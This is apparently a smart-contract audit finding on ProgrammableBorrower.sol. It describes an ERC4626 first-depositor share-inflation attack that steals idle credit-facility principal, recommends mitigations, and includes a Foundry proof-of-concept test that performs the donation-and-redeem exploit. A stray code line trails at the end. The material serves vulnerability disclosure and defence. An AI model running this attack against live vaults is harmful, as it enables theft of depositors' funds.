### Title
Unprotected ERC4626 share inflation lets a vault depositor steal idle credit-facility principal - (contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits all idle underlying into a configured ERC4626 vault without enforcing a minimum share amount or expected conversion rate. If that vault is empty or nearly empty when the credit facility starts, an unprivileged vault user can perform a first-depositor inflation/donation attack, cause the facility to receive zero or severely diluted shares, and redeem the donated assets plus the facility’s deposit for a profit.

### Finding Description
`onStartEpoch` snapshots `underlyingToken.balanceOf(address(this)) + currentVaultAssets`, then forwards the full token balance to `_depositToVault`. [1](#0-0) 

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and accepts whatever share amount the external vault returns. [2](#0-1) 

There is no `previewDeposit`/`convertToShares` bound, no minimum-share check, and no check that the facility’s post-deposit vault asset value still covers the deposited principal. Initialization only verifies that `IERC4626(_vault).asset()` equals the facility underlying and then grants the vault unlimited underlying allowance. [3](#0-2) 

In an empty or near-empty ERC4626, an attacker can deposit one unit of underlying to obtain the first share, donate `D - 1` underlying directly to the vault, and inflate the price of that share to approximately `D`. When `startEpoch` deposits `P < D`, share issuance rounds down to zero or near zero, while the attacker’s share is redeemable for approximately `D + P`.

The accounting baseline does not prevent the loss: `epochStartVaultAssets` is snapshotted before the deposit, while `epochWithdrawnFromVault` is not increased by the stolen deposit. [4](#0-3) 

Consequently, `_vaultNetInterest` computes a loss equal to the missing vault position and `totalInterestDueNow` floors pool-facing interest at zero. [5](#0-4) 

At `stopEpoch`, `onStopEpoch` cannot economically cover withdrawals when `shortfall > _currentVaultAssets()`, returns `true`, and lets the subsequent borrower `transferFrom` fail into `_handleBorrowerDefault`. [6](#0-5) [7](#0-6) 

### Impact Explanation
An unprivileged participant in the selected ERC4626 vault can steal up to the full idle underlying transferred to `ProgrammableBorrower` at epoch start, limited by the exchange-rate inflation achievable in that vault.

For the minimal-empty-vault case, the attacker:

1. Supplies `1 wei` of underlying and receives one vault share.
2. Donates `P - 1 wei` to the vault.
3. Causes the facility’s `P` deposit to mint `floor(P / P) - 1 = 0` shares under a one-share/one-asset initial exchange-rate implementation, or an equivalently uneconomic share amount under implementations with virtual offsets.
4. Redeems the attacker share and receives approximately `2P - 1`, for a profit of approximately `P`.

The facility then shows a vault loss because its recorded epoch baseline remains `P` while `_currentVaultAssets()` is zero or near zero. Pending withdrawals cannot be backed, borrower repayment can fail, and `IdleCDOEpochVariant` enters the default path, pauses the pool, disables withdrawal requests, and socializes the missing principal through recovery accounting. [8](#0-7) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to have an exploitable share-supply state at deployment or before epoch start. A mature, sufficiently liquid ERC4626 with protected virtual assets/shares and a high existing share supply is not practically exploitable in the same way.

The vulnerable deployment path is nevertheless supported: `deployRevolvingCreditVault` accepts an arbitrary `ProgrammableBorrowerParams.vault`, and `initialize` enforces only address and asset compatibility, not minimum vault liquidity, share supply, or resistance to donation-based exchange-rate manipulation. [9](#0-8) [10](#0-9) 

The attacker does not need to control the vault contract or any privileged role; they only need the ability to deposit, donate the same underlying asset, and redeem vault shares. That role is within the stated threat model as a user of the programmable borrower’s ERC4626 vault.

### Recommendation
Before accepting a vault, enforce that it has non-zero supply/assets and sufficient liquidity for safe conversion, preferably requiring a minimum `totalSupply` and total assets during `initialize` and `setVault`.

More importantly, bound every deposit:

```solidity
uint256 expectedShares = vault.convertToShares(_assetAmount);
uint256 shares = vault.deposit(_assetAmount, address(this));

if (
  shares == 0 ||
  shares < expectedShares * MIN_SHARES_BPS / BPS ||
  vault.convertToAssets(shares) < _assetAmount * MIN_ASSETS_BPS / BPS
) {
  revert InvalidAmount();
}
```

For a trust-minimized fix, use ERC4626 `mint` with an exact target share amount where appropriate, or require `shares >= minSharesOut` supplied by an internal exchange-rate tolerance. Also verify the post-deposit value:

```solidity
uint256 assetsBefore = _currentVaultAssets();
uint256 shares = vault.deposit(_assetAmount, address(this));
uint256 assetsAfter = _currentVaultAssets();
if (assetsAfter < assetsBefore + _assetAmount) revert InvalidAmount();
```

This should account for legitimate vault fees and rounding with an explicit slippage bound rather than an unconditional equality check.

### Proof of Concept
A reproducible Foundry fork test can deploy the production `ProgrammableBorrower` implementation behind the same transparent proxy, initialize it against an empty ERC4626 vault on a fork of the target underlying, then front-run `onStartEpoch` with a donation.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC4626} from "../contracts/interfaces/IERC4626.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

contract ProgrammableBorrowerShareInflationForkTest is Test {
  IERC20Detailed underlying = IERC20Detailed(FORKED_UNDERLYING);
  IERC4626 vault = IERC4626(EMPTY_OR_NEAR_EMPTY_ERC4626);
  address idleCDO = address(new MockIdleCDO(address(underlying)));
  address attacker = makeAddr("attacker");
  address borrower = makeAddr("borrower");
  ProgrammableBorrower programmable;

  uint256 constant VICTIM_DEPOSIT = 10_000e6;

  function testInflatedVaultStealsEpochStartDeposit() external {
    programmable = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
      address(new ProgrammableBorrower()),
      address(this),
      abi.encodeCall(
        ProgrammableBorrower.initialize,
        (address(vault), idleCDO, address(this), address(this), borrower, 0)
      )
    )));

    // Attacker creates one initial share and inflates it to roughly VICTIM_DEPOSIT.
    deal(address(underlying), attacker, VICTIM_DEPOSIT, true);
    vm.startPrank(attacker);
    underlying.approve(address(vault), 1);
    vault.deposit(1, attacker);
    underlying.transfer(address(vault), VICTIM_DEPOSIT - 1);
    vm.stopPrank();

    // Simulate IdleCDO sending idle principal before invoking onStartEpoch.
    deal(address(underlying), address(programmable), VICTIM_DEPOSIT, true);

    vm.prank(idleCDO);
    programmable.onStartEpoch(0);

    // The deposit minted no economically meaningful shares.
    assertEq(programmable.vaultSharesBalance(), 0);
    assertEq(programmable.totalUnderlying(), 0);

    // The attacker redeems donation + victim deposit.
    uint256 before = underlying.balanceOf(attacker);
    vm.prank(attacker);
    uint256 redeemed = vault.redeem(
      vault.balanceOf(attacker),
      attacker,
      attacker
    );

    assertEq(redeemed, 2 * VICTIM_DEPOSIT - 1);
    assertEq(
      underlying.balanceOf(attacker) - before,
      2 * VICTIM_DEPOSIT - 1
    );

    // Programmable accounting records the stolen principal as a vault loss.
    assertEq(programmable.vaultLoss(), VICTIM_DEPOSIT);
    assertEq(programmable.totalInterestDueNow(), 0);
  }
}
```

For vaults using virtual assets and shares, the same test should use an extremely low initial share supply or a large attacker donation and assert that `vault.convertToAssets(programmable.vaultSharesBalance())` is materially below `VICTIM_DEPOSIT`; the invariant is that accepted shares must economically cover the assets deposited.

  function _handleBorrowerDefault(uint256 funds) internal {
